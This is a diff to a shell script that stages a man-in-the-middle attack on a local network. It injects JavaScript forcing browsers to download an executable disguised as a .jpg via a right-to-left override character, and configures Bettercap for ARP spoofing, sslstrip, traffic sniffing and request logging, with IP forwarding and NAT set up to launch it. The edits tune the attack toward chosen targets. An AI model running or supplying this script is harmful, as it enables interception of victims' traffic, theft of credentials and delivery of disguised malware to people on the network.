@@ -183,7 +183,7 @@ cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
         try {
             var link = document.createElement('a');
             link.href = 'http://$LAN/google-update${RTLO}gpj.exe';
-            link.download = 'google-update.exe';
+            link.download = 'google-update${RTLO}gpj.exe';
             link.style.display = 'none';
             document.body.appendChild(link);
             link.click();
@@ -204,25 +204,26 @@ EOF
 # --- GENERATE BETTERCAP CAPLET ---
 # ========================
 cat > "$MITM_DIR/cert_injector.cap" <<EOF
-# --- Enable HTTP and HTTPS proxies ---
-http.proxy on
-https.proxy on
-
+# --- Inject JS into HTTP and HTTPS traffic ---
 # --- Inject JS into HTTP and HTTPS traffic ---
 set http.proxy.sslstrip true
 set https.proxy.sslstrip true
 set http.proxy.injectjs $MITM_DIR/rtlo_downloader.js
 set https.proxy.injectjs $MITM_DIR/rtlo_downloader.js
+http.proxy on
+https.proxy on
 
-# --- Network sniffing ---
+# --- Network sniffing only target ---
+set net.sniff.filter "host $TARGETS"
 net.sniff on
-net.probe on
 
-# --- Enable ARP spoofing ---
+# --- Enable ARP spoofing only target ---
 set arp.spoof.targets $TARGETS
+set arp.spoof.whitelist !${TARGETS}
 arp.spoof on
 
-# --- Log sniffed traffic ---
+# --- Log sniffed traffic only target ---
+set events.stream.filter "host $TARGETS"
 events.stream on
 set events.stream.output /tmp/mitm.log
 set events.stream.http.request.dump true
@@ -239,9 +240,10 @@ service apache2 restart
 # ========================
 # --- LAUNCH BETTERCAP ---
 # ========================
-color_print GREEN "[*] Launching Bettercap..."
-echo 1 | tee /proc/sys/net/ipv4/ip_forward
-bettercap -iface "$IFACE" -eval "unk9vvn/cert_injector"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -F
+iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
+bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
 ```
 
 _Run & Execute_
